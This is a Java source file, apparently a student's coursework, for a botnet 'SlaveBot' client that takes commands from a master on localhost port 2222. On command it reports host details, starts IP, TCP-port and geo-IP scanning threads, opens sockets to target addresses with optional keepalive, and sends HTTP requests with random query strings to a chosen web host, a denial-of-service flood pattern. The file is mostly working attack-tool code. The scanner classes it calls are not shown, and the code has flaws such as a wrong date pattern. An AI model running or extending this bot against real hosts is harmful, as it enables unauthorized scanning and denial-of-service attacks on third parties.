/*
 * 206 Programming Project: Part 4
 *
 * Author:      Yuwen Li
 * Student ID:  011541868
 * Major:       Computer Engineering
 *              San Jose State University
 */
package socket;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Random;
import java.util.Scanner;  

public class SlaveBot{   
	
public  static void main(String[] args) {        
    Socket socket = null; 
    while (true) {   
        try {  
            //create socket
        	   String ran = "aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ0123456789";
       	    Random random = new Random();
       		StringBuffer stringBuffer = new StringBuffer();
       		int stringLength = (int) (Math.random()*10);
       		for (int j = 0; j < stringLength; j++)
       		{
       		    int index = random.nextInt(ran.length());
       		    char c = ran.charAt(index);
       		    stringBuffer.append(c);    
       		 }
       		String string = stringBuffer.toString();
        	int hostport=2222;
        	Socket socket1=new Socket("localhost",hostport);
            Date date= new Date();//get current time
            SimpleDateFormat sdf = new SimpleDateFormat("YYYY-MM-DD");//set the format for showing time
            String str = sdf.format(date);//convert time into format
            InetAddress ia=null;
            //get the input 
            String ret=null;
            DataInputStream input = new DataInputStream(socket1.getInputStream());        
            ret = input.readUTF(); 
            System.out.println("command from the master is: "+ret);
          if  ("list".equals(ret)) {       //show the information about slave
                	   
                	DataOutputStream out = new DataOutputStream(socket1.getOutputStream());      
                ia=InetAddress.getLocalHost(); 
                String name=ia.getHostName()+" "+ia.getHostAddress()+" "+socket1.getPort()+" "+str;
                out.writeUTF(name);   
                continue;
                }
          else { 
            	String ipa=null;
                String po=null;
                String[] a = ret.split(" ");
           
         {
         if("ipscan".equals(a[0]))
          {  
        	  new Thread(new ipThread(socket1,ret)).start();
        	  continue;

}
         else if("tcpportscan".equals(a[0])) 
         {    ipa=a[2];
        	 new Thread(new portThread(socket1,ret,ipa)).start();
   	          continue;

    }
        else if("geoipscan".equals(a[0]))
        {
        	 new Thread(new geoThread(socket1,ret)).start();
        	continue;
         }
          else if("connect".equals(a[0]))
         { 
            
        	  ipa=a[2];
            po=a[3];
            if (a.length==4)
            {
            	int  prt = Integer.parseInt(po) ;
                System.out.println("Connected via:"+ipa+":"+prt);
                socket = new Socket(ipa,prt);
                continue;
            }
            else if(a.length==5){ 
            	if("keepalive".equals(a[4]))
 		   {    
            	int  prt = Integer.parseInt(po) ;
                socket = new Socket(ipa,prt);
                socket.setKeepAlive(true);
                if(socket.getKeepAlive())
                {
                	System.out.println("Connected via:"+ipa+":"+prt+" (keepalive model)");
                }
                continue;
              }
            	else {
            		String web=a[2];
            		String c_url="http://"+web+"/#q="+string;
            		URL url = new URL(c_url);  
                HttpURLConnection urlcon = (HttpURLConnection)url.openConnection();  
                urlcon.connect();         
                System.out.println("connected to:"+c_url);
            	}
            	continue;
            }
       
            }

          else if("disconnect".equals(a[0]))
        {     
         socket.close();
         break;}
            }
    }break;
          }              
         catch (Exception e) {  
            System.out.println("no server");   
        } finally {  
            if (socket != null) {  
                try {  
                    socket.close();  
                } catch (IOException e) {  
                    socket = null;   
                    System.out.println("slave finally error:");   
                }  
            }  
        }  
    }    
}    
}